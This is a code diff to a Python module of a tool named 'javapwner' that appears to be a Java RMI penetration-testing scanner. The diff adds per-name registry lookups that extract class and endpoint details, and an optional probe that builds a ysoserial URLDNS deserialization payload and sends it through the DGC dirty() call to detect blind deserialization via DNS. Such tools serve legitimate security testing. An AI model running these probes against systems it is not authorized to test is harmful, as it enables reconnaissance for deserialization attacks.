@@ -23,8 +23,10 @@ from javapwner.exceptions import ConnectionError
 from javapwner.protocols.rmi.protocol import (
     build_jrmp_handshake,
     build_list_call,
+    build_lookup_call,
     parse_jrmp_ack,
     parse_registry_return,
+    parse_lookup_return,
     DGC_OBJID,
     MSG_CALL,
     JAVA_STREAM_MAGIC,
@@ -62,6 +64,14 @@ class RmiScanResult:
     dgc_reachable: bool = False
     jep290_active: bool | None = None  # None = unknown
 
+    # Lookup details (E.2)
+    name_types: dict[str, str] = field(default_factory=dict)
+    stub_endpoints: dict[str, dict] = field(default_factory=dict)
+
+    # URLDNS probe (I.6)
+    urldns_sent: bool = False
+    urldns_canary: str | None = None
+
     # Raw data
     raw_return_bytes: bytes = field(default=b"", repr=False)
     error: str | None = None
@@ -88,6 +98,10 @@ class RmiScanResult:
             "is_registry": self.is_registry,
             "bound_names": self.bound_names,
             "dgc_jep290": jep290_str,
+            "name_types": self.name_types,
+            "stub_endpoints": self.stub_endpoints,
+            "urldns_sent": self.urldns_sent,
+            "urldns_canary": self.urldns_canary,
             "error": self.error,
         }
 
@@ -110,8 +124,21 @@ class RmiScanner:
     def __init__(self, timeout: float = 5.0):
         self.timeout = timeout
 
-    def scan(self, host: str, port: int) -> RmiScanResult:
-        """Full scan: JRMP confirm → Registry list → DGC probe."""
+    def scan(
+        self,
+        host: str,
+        port: int,
+        *,
+        urldns_canary: str | None = None,
+    ) -> RmiScanResult:
+        """Full scan: JRMP confirm → Registry list → lookup → DGC probe.
+
+        Parameters
+        ----------
+        urldns_canary:
+            If provided, send a URLDNS payload via DGC dirty() to detect
+            blind deserialization. Check DNS logs for resolution.
+        """
         result = RmiScanResult(host=host, port=port)
 
         # --- Step 1: JRMP handshake ---
@@ -122,8 +149,16 @@ class RmiScanner:
         # --- Step 2: Registry list() ---
         self._registry_list(host, port, ack_data, result)
 
+        # --- Step 2b: Lookup per bound name ---
+        if result.bound_names:
+            self._registry_lookups(host, port, result)
+
         # --- Step 3: DGC JEP 290 probe ---
         self._dgc_probe(host, port, result)
+
+        # --- Step 4: URLDNS canary (optional) ---
+        if urldns_canary:
+            self._urldns_probe(host, port, urldns_canary, result)
 
         return result
 
@@ -195,6 +230,64 @@ class RmiScanner:
         except ConnectionError:
             pass
 
+    def _registry_lookups(
+        self, host: str, port: int, result: RmiScanResult
+    ) -> None:
+        """Call lookup() for each bound name and extract class/endpoint info."""
+        for name in result.bound_names:
+            try:
+                with TCPSession(host, port, timeout=self.timeout) as sess:
+                    sess.send(build_jrmp_handshake())
+                    ack = sess.recv(512, exact=False)
+                    if not ack:
+                        continue
+                    try:
+                        parse_jrmp_ack(ack)
+                    except ValueError:
+                        continue
+
+                    sess.send(build_lookup_call(name))
+                    raw = sess.recv_all(timeout=_RECV_TIMEOUT)
+                    if not raw:
+                        continue
+
+                    parsed = parse_lookup_return(raw)
+                    if parsed.get("class_name"):
+                        result.name_types[name] = parsed["class_name"]
+                    if parsed.get("endpoint"):
+                        result.stub_endpoints[name] = parsed["endpoint"]
+            except ConnectionError:
+                continue
+
+    def _urldns_probe(
+        self, host: str, port: int, canary: str, result: RmiScanResult
+    ) -> None:
+        """Send a URLDNS ysoserial payload via DGC to detect blind deser."""
+        try:
+            from javapwner.core.payload import YsoserialWrapper
+            wrapper = YsoserialWrapper()
+            payload = wrapper.generate_urldns(canary)
+        except Exception:
+            return
+
+        dgc_call = _build_dgc_dirty_call(payload)
+        try:
+            with TCPSession(host, port, timeout=self.timeout) as sess:
+                sess.send(build_jrmp_handshake())
+                ack = sess.recv(512, exact=False)
+                if not ack:
+                    return
+                try:
+                    parse_jrmp_ack(ack)
+                except ValueError:
+                    return
+                sess.send(dgc_call)
+                sess.recv_all(timeout=_RECV_TIMEOUT)
+                result.urldns_sent = True
+                result.urldns_canary = canary
+        except ConnectionError:
+            pass
+
     def _dgc_probe(self, host: str, port: int, result: RmiScanResult) -> None:
         """DGC JEP 290 probe using a harmless serialised HashMap."""
         hashmap_payload = _build_hashmap_payload()
@@ -227,8 +320,10 @@ class RmiScanner:
 # DGC helpers (self-contained, no dependency on jini/jrmp.py)
 # ---------------------------------------------------------------------------
 
-_DGC_OP_INDEX = _struct.pack(">i", 1)          # dirty() op index
-_DGC_INTERFACE_HASH = _struct.pack(">q", -0x09479727740D7302)
+_DGC_OP_INDEX = _struct.pack(">i", 1)          # dirty() op index (old-style dispatch)
+# DGC interface hash — source: sun/rmi/transport/DGCImpl_Skel.class
+# 0xF6B6898D8BF28643 unsigned = -669196253586618813 signed int64
+_DGC_INTERFACE_HASH = _struct.pack(">q", -669196253586618813)
 
 
 def _build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
